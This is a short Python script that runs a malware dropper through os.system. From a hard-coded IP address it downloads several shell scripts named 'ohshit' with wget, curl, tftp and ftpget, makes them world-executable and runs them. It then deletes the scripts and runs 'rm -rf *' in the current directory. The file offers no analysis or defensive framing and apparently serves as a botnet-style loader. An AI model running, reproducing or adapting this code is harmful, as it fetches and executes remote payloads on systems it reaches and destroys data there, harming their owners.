import os

commands = """
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.194.177.120/ohshit.sh; curl -O http://185.194.177.120/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 185.194.177.120 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 185.194.177.120; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.194.177.120 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf * 
"""

os.system(commands)
